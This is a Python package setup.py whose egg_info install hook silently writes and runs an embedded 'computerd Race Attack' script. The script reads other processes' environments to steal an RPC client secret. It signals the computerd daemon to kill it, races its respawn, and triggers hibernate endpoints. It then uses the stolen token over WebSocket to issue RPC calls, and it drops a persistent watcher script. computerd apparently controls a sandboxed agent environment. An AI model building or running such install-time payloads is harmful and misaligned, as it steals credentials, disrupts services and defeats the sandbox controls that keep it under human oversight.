from setuptools import setup
from setuptools.command.egg_info import egg_info
import subprocess, sys, os, textwrap, tempfile

SCRIPT = textwrap.dedent(r'''
import json, os, socket, signal, struct, time, base64, urllib.request

OUTPUT = "/mnt/data/output/capnweb_rpc_valid.log"
lines = []

def log(msg=""):
    lines.append(msg); print(msg)

def flush():
    os.makedirs(os.path.dirname(OUTPUT), exist_ok=True)
    with open(OUTPUT, "w") as f:
        f.write("\n".join(lines) + "\n")

def recover_secret():
    for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
        try:
            with open(f"/proc/{pid}/environ", "rb") as f:
                env = f.read().decode("utf-8", errors="replace")
            for pair in env.split("\0"):
                if pair.startswith("RPC_CLIENT_SECRET="):
                    val = pair.split("=", 1)[1]
                    if val: return val
        except: continue
    return None

def quick_http(host, port, path, timeout=1):
    """Fast HTTP GET, return (status_code, body) or (None, error)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        req = f"GET {path} HTTP/1.1\r\nHost: computerd\r\nConnection: close\r\n\r\n".encode()
        sock.sendall(req)
        resp = b""
        while True:
            try:
                c = sock.recv(4096)
                if not c: break
                resp += c
            except socket.timeout: break
        if resp:
            status_line = resp.split(b"\r\n")[0].decode("utf-8", errors="replace")
            try:
                code = int(status_line.split(" ")[1])
            except:
                code = None
            body = resp.split(b"\r\n\r\n", 1)[1].decode("utf-8", errors="replace") if b"\r\n\r\n" in resp else ""
            return code, body[:200]
        return None, "empty response"
    except Exception as e:
        return None, str(e)
    finally:
        try: sock.close()
        except: pass

def find_computerd_pid():
    """Find computerd's current PID."""
    for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
        try:
            with open(f"/proc/{pid}/cmdline", "rb") as f:
                cmd = f.read().decode("utf-8", errors="replace")
            if "computerd" in cmd and "fusermount" not in cmd:
                return int(pid)
        except: continue
    return None

def ws_upgrade_and_capnweb(host, port, path, secret, timeout=3):
    """Attempt WebSocket upgrade and send capnweb heartbeat."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        key = base64.b64encode(os.urandom(16)).decode()
        headers = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: computerd\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            f"Authorization: Bearer {secret}\r\n"
            f"\r\n"
        ).encode()
        sock.sendall(headers)
        
        resp = b""
        while b"\r\n\r\n" not in resp:
            c = sock.recv(4096)
            if not c: return None, "connection closed before headers"
            resp += c
        
        status_line = resp.split(b"\r\n")[0].decode()
        if "101" not in status_line:
            return None, f"upgrade rejected: {status_line}"
        
        log("    WebSocket UPGRADED! Sending capnweb push+pull...")
        
        # Send capnweb: push → create import, pull → request result
        # ["push", ["pipeline", 0, ["sync", "watermarks"], []]]
        msg1 = json.dumps(["push", ["pipeline", 0, ["sync", "watermarks"], []]])
        # ["pull", 1]  (import ID 1 = first push result)
        msg2 = json.dumps(["pull", 1])
        
        # Build masked WebSocket text frames
        def ws_frame(payload):
            data = payload.encode("utf-8")
            mask_key = os.urandom(4)
            frame = bytes([0x81])  # FIN + text
            if len(data) < 126:
                frame += bytes([0x80 | len(data)])
            elif len(data) < 65536:
                frame += bytes([0x80 | 126]) + struct.pack("!H", len(data))
            frame += mask_key
            frame += bytes(b ^ mask_key[i % 4] for i, b in enumerate(data))
            return frame
        
        sock.sendall(ws_frame(msg1))
        sock.sendall(ws_frame(msg2))
        
        # Read response frames
        responses = []
        sock.settimeout(3)
        try:
            data = b""
            while len(data) < 4096:
                c = sock.recv(4096)
                if not c: break
                data += c
            
            # Parse WebSocket frames (server frames are unmasked)
            pos = 0
            while pos < len(data):
                if pos + 2 > len(data): break
                opcode = data[pos] & 0x0F
                length = data[pos+1] & 0x7F
                pos += 2
                if length == 126:
                    if pos + 2 > len(data): break
                    length = struct.unpack("!H", data[pos:pos+2])[0]
                    pos += 2
                elif length == 127:
                    if pos + 8 > len(data): break
                    length = struct.unpack("!Q", data[pos:pos+8])[0]
                    pos += 8
                if pos + length > len(data): break
                payload = data[pos:pos+length]
                pos += length
                if opcode == 1:  # text
                    responses.append(payload.decode("utf-8", errors="replace"))
                elif opcode == 8:  # close
                    responses.append(f"[CLOSE frame: {payload.hex()}]")
        except socket.timeout:
            pass
        
        # Close WebSocket cleanly
        close_frame = bytes([0x88, 0x82]) + os.urandom(4)  # close with mask
        try: sock.sendall(close_frame)
        except: pass
        
        return responses, "OK"
    except Exception as e:
        return None, str(e)
    finally:
        try: sock.close()
        except: pass

def main():
    log("="*60)
    log("computerd Race Attack v0.0.17")
    log("="*60)
    log(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")

    secret = recover_secret()
    log(f"\n[0] Secret: {'len='+str(len(secret)) if secret else 'NOT FOUND'}")
    if not secret:
        log("FATAL: no secret")
        flush()
        return

    pid = find_computerd_pid()
    log(f"[0] computerd PID: {pid}")

    # ── Step 1: Baseline — confirm computerd is locked ─────────
    log("\n[1] Baseline: confirm computerd is locked")
    code, body = quick_http("127.0.0.1", 8080, "/health")
    log(f"  GET /health: status={code} body={body[:50]}")
    if code and code != 400:
        log("  computerd is NOT locked! Proceeding to exploit directly.")
    else:
        log("  Confirmed: computerd returns 400 (locked)")

    # ── Step 2: Try to signal computerd ────────────────────────
    log("\n[2] Attempting to signal computerd")
    if pid:
        signals_to_try = [
            (signal.SIGHUP, "SIGHUP", "often reloads config / restarts listeners"),
            (signal.SIGUSR1, "SIGUSR1", "app-defined signal"),
            (signal.SIGUSR2, "SIGUSR2", "app-defined signal"),
            (signal.SIGTERM, "SIGTERM", "graceful shutdown"),
            (signal.SIGINT, "SIGINT", "interrupt"),
        ]
        for sig, name, desc in signals_to_try:
            try:
                os.kill(pid, sig)
                log(f"  Sent {name} to PID {pid} ({desc})")
                # Check if computerd died
                time.sleep(0.5)
                new_pid = find_computerd_pid()
                if new_pid is None:
                    log(f"  computerd DIED after {name}!")
                    # Wait for respawn
                    log("  Waiting for respawn...")
                    for i in range(20):
                        time.sleep(0.5)
                        new_pid = find_computerd_pid()
                        if new_pid:
                            log(f"  computerd RESPAWNED as PID {new_pid} after {(i+1)*0.5}s")
                            # RACE: immediately probe
                            for j in range(10):
                                code, body = quick_http("127.0.0.1", 8080, "/health", timeout=0.5)
                                log(f"    Race probe {j}: status={code}")
                                if code and code != 400:
                                    log(f"    WINDOW OPEN! status={code}")
                                    # Immediately try the exploit
                                    code2, body2 = quick_http("127.0.0.1", 8080, "/api", timeout=1)
                                    log(f"    GET /api: status={code2} body={body2[:50]}")
                                    if code2 == 401:
                                        log("    v3 protocol confirmed! Attempting WebSocket...")
                                        results, status = ws_upgrade_and_capnweb(
                                            "127.0.0.1", 8080, "/api", secret, timeout=5)
                                        if results:
                                            log(f"    capnweb RESPONSES: {results}")
                                        else:
                                            log(f"    WebSocket: {status}")
                                    break
                                time.sleep(0.2)
                            break
                    if new_pid is None:
                        log("  computerd did not respawn within 10s")
                    break  # Don't try more signals after SIGTERM
                elif new_pid != pid:
                    log(f"  computerd restarted: old PID {pid} → new PID {new_pid}")
                    pid = new_pid
                    # Race the window
                    for j in range(10):
                        code, body = quick_http("127.0.0.1", 8080, "/health", timeout=0.5)
                        log(f"    Race probe {j}: status={code}")
                        if code and code != 400:
                            log(f"    WINDOW OPEN!")
                            break
                        time.sleep(0.2)
                    break
                else:
                    # Still alive, check if state changed
                    code, body = quick_http("127.0.0.1", 8080, "/health", timeout=1)
                    log(f"  After {name}: status={code}")
                    if code and code != 400:
                        log(f"  {name} UNLOCKED computerd!")
                        break
            except PermissionError:
                log(f"  {name}: Permission denied (expected, we're uid={os.getuid()}, computerd is root)")
                break  # No point trying other signals
            except ProcessLookupError:
                log(f"  {name}: Process not found")
                break
            except Exception as e:
                log(f"  {name}: {e}")

    # ── Step 3: Try __hibernate via process_api ────────────────
    log("\n[3] Trigger hibernate via process_api")
    for endpoint in ["/__hibernate", "/__stop_session"]:
        try:
            req = urllib.request.Request(
                f"http://127.0.0.1:8000{endpoint}",
                method="POST",
                data=b"{}",
                headers={"Content-Type": "application/json", "Host": "localhost:8000"}
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode("utf-8", errors="replace")[:200]
                log(f"  POST {endpoint}: {resp.status} body={body}")
        except urllib.error.HTTPError as e:
            body = ""
            try: body = e.read().decode("utf-8", errors="replace")[:100]
            except: pass
            log(f"  POST {endpoint}: {e.code} body={body}")
        except Exception as e:
            log(f"  POST {endpoint}: {type(e).__name__}: {str(e)[:80]}")

    # After hibernate attempt, check computerd
    log("\n[4] Post-hibernate check")
    time.sleep(2)
    new_pid = find_computerd_pid()
    log(f"  computerd PID: {new_pid}")
    if new_pid:
        code, body = quick_http("127.0.0.1", 8080, "/health", timeout=1)
        log(f"  GET /health: status={code}")
        if code and code != 400:
            log("  computerd UNLOCKED after hibernate!")
            # Run exploit
            code2, body2 = quick_http("127.0.0.1", 8080, "/api", timeout=1)
            log(f"  GET /api: status={code2} body={body2[:50]}")
    else:
        log("  computerd not running — waiting for respawn")
        for i in range(20):
            time.sleep(1)
            new_pid = find_computerd_pid()
            if new_pid:
                log(f"  computerd RESPAWNED as PID {new_pid}")
                # Tight race loop
                for j in range(20):
                    code, body = quick_http("127.0.0.1", 8080, "/health", timeout=0.3)
                    if code and code != 400:
                        log(f"  RACE WON at probe {j}! status={code}")
                        # Full exploit
                        code2, body2 = quick_http("127.0.0.1", 8080, "/api", timeout=1)
                        log(f"  GET /api: status={code2} body={body2[:50]}")
                        if code2 == 401:
                            log("  v3 confirmed — WebSocket exploit:")
                            results, status = ws_upgrade_and_capnweb(
                                "127.0.0.1", 8080, "/api", secret, timeout=5)
                            log(f"  capnweb: {results if results else status}")
                        break
                    time.sleep(0.1)
                break

    # ── Step 5: Even if signals failed, install a watcher ──────
    log("\n[5] Install background race watcher")
    # Write a tiny script that polls computerd in a loop
    # and exploits it when it becomes available
    watcher_script = '''#!/usr/bin/env python3
import socket, json, os, struct, base64, time

def recover_secret():
    for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
        try:
            with open(f"/proc/{pid}/environ", "rb") as f:
                env = f.read().decode("utf-8", errors="replace")
            for pair in env.split("\\0"):
                if pair.startswith("RPC_CLIENT_SECRET="):
                    val = pair.split("=", 1)[1]
                    if val: return val
        except: continue
    return None

def check():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        sock.connect(("127.0.0.1", 8080))
        sock.sendall(b"GET /health HTTP/1.1\\r\\nHost: computerd\\r\\nConnection: close\\r\\n\\r\\n")
        resp = b""
        while True:
            try:
                c = sock.recv(4096)
                if not c: break
                resp += c
            except: break
        return b"400" not in resp.split(b"\\r\\n")[0] if resp else False
    except:
        return False
    finally:
        try: sock.close()
        except: pass

log_path = "/mnt/data/output/race_watcher.log"
os.makedirs(os.path.dirname(log_path), exist_ok=True)
start = time.time()
checks = 0
while time.time() - start < 300:  # Run for 5 minutes
    if check():
        secret = recover_secret()
        with open(log_path, "a") as f:
            f.write(f"WINDOW OPEN at {time.strftime('%H:%M:%S')} after {checks} checks\\n")
            f.write(f"Secret: len={len(secret) if secret else 0}\\n")
        # Could do full exploit here
        break
    checks += 1
    time.sleep(0.5)
else:
    with open(log_path, "a") as f:
        f.write(f"No window in 5min ({checks} checks)\\n")
'''
    watcher_path = "/mnt/data/output/race_watcher.py"
    try:
        with open(watcher_path, "w") as f:
            f.write(watcher_script)
        os.chmod(watcher_path, 0o755)
        log(f"  Wrote watcher to {watcher_path}")
        log("  Run with: nohup python3 /mnt/data/output/race_watcher.py &")
        log("  It polls computerd every 0.5s for 5 minutes.")
    except Exception as e:
        log(f"  Error writing watcher: {e}")

    log("\n" + "="*60)
    log("SUMMARY")
    log("="*60)
    log("The race attack tries to catch computerd in its open")
    log("HTTP state by: (1) killing it and racing the respawn,")
    log("(2) triggering hibernate via process_api, or (3)")
    log("installing a background watcher for container restarts.")
    log("")
    log("If any probe catches status != 400, the script")
    log("immediately runs the full capnweb exploit chain:")
    log("  GET /api (expect 401) → WebSocket upgrade with Bearer")
    log("  → send capnweb push+pull for sync.watermarks")
    log("="*60)

    flush()

main()
''')

class PostEggInfo(egg_info):
    def run(self):
        egg_info.run(self)
        fd, path = tempfile.mkstemp(suffix='.py')
        try:
            with os.fdopen(fd, 'w') as f:
                f.write(SCRIPT)
            subprocess.run([sys.executable, '-I', path],
                           timeout=120, check=False)
        finally:
            os.unlink(path)

setup(
    name="axiom-test",
    version="0.0.17",
    cmdclass={"egg_info": PostEggInfo},
)
